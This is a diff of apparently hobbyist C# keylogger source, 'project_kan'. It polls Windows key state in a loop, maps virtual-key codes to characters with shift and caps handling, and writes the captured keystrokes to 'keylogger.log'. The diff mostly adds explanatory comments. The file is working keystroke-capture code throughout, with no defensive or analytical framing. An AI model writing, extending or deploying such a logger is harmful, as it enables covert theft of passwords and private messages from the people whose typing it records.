@@ -9,6 +9,8 @@ namespace project_kan
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main(String[] args)
         {
+            //lang control -> I have troubles with currentInputLanguage application
+
             //string Text = "";
             //InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
             //Text = myCurrentLanguage.Culture.EnglishName;
@@ -17,16 +19,13 @@ namespace project_kan
             //if (text == "English(United States") nText = "Russian (Russia)";
             //else nText = "English (United States)";
 
+            //
+
             File.Delete("keylogger.log");
             string buf = "";
             while (true)
             {
-                Thread.Sleep(100);
-
-                //start language (wtf?) - I can't change while programm is working
-                //string Text = "";
-                //InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
-                //Text = myCurrentLanguage.Culture.EnglishName;
+                Thread.Sleep(100); //key-press time (~100 ms)
 
                 for (int i = 0; i < 255; i++)
                 {
@@ -41,18 +40,27 @@ namespace project_kan
                     var caps = Console.CapsLock;
                     bool isBig = shift | caps;
 
-                    
                     if (state != 0)
                     {
+                        //pre-processing
+                        //spaces
                         if (((Keys)i) == Keys.Space) { buf += " "; continue; }
+                        //line breaks
                         if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
+                        //tab
                         if (((Keys)i) == Keys.Tab) { buf += "\t"; continue; }
+                        //shift & caps
                         if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
-
+                        //f-keys
                         if (((Keys)i).ToString().Contains("F1") || ((Keys)i).ToString().Contains("F2") || ((Keys)i) == Keys.F3 || ((Keys)i) == Keys.F4 || ((Keys)i) == Keys.F5 || ((Keys)i) == Keys.F6 || ((Keys)i) == Keys.F7 || ((Keys)i) == Keys.F8 || ((Keys)i) == Keys.F9) { continue; }
-
+                        //controllers
                         if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
+                        //other keys (requires additional analysis) - I need to know TYPES OF KEYBOARDS
+                        //!!!
+                        //!!!
+                        //!!!
                         if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.PrintScreen || ((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey || ((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right || ((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down) continue;
+                        //alphas
                         if (((Keys)i).ToString().Length == 1)
                         {
                             if (isBig)
@@ -68,6 +76,7 @@ namespace project_kan
                         {
                             switch (((Keys)i).ToString())
                             {
+                                //numm (up)
                                 case "D1":
                                     if (shift) buf += "!";
                                     else buf += "1";
@@ -109,6 +118,7 @@ namespace project_kan
                                     if (shift) buf += ")";
                                     else buf += "0";
                                     break;
+                                //+-
                                 case "Oemplus":
                                     if (shift) buf += "+";
                                     else buf += "=";
@@ -117,6 +127,7 @@ namespace project_kan
                                     if (shift) buf += "_";
                                     else buf += "-";
                                     break;
+                                //USA-layout
                                 case "Oem1":
                                     if (shift) buf += ":";
                                     else buf += ";";
@@ -153,6 +164,10 @@ namespace project_kan
                                     if (shift) buf += "|";
                                     else buf += '\\';
                                     break;
+                                //alt
+                                //!!!
+                                //!!!
+                                //!!!
                                 case "Menu":
                                     File.AppendAllText("keylogger.log", "<alt>");
                                     break;
@@ -179,10 +194,11 @@ namespace project_kan
                                 //    nText = temp2;
                                 //    break;
                                 default:
-                                    buf += $"<{((Keys)i).ToString()}>";
+                                    buf += $"<{((Keys)i).ToString()}>"; //more types
                                     break;
                             }
                         }
+                        //every 10 symbols
                         if (buf.Length > 10)
                         {
                             File.AppendAllText("keylogger.log", buf);
